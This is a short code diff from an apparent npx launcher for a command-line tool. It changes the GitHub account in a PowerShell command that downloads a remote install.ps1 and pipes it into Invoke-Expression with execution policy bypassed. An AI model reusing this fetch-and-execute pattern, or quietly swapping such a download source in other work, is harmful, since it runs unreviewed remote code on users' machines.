@@ -16,7 +16,7 @@ if (fs.existsSync(localBat)) {
     child.on('exit', (code) => process.exit(code || 0));
 } else {
     // Running via npx / remote npm
-    const psCmd = 'irm https://raw.githubusercontent.com/Krzyzyk33/CMDAI-CODE/main/install.ps1 | iex';
+    const psCmd = 'irm https://raw.githubusercontent.com/DevP10TR/CMDAI-CODE/main/install.ps1 | iex';
     const child = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', psCmd], {
         stdio: 'inherit',
         cwd: process.cwd()
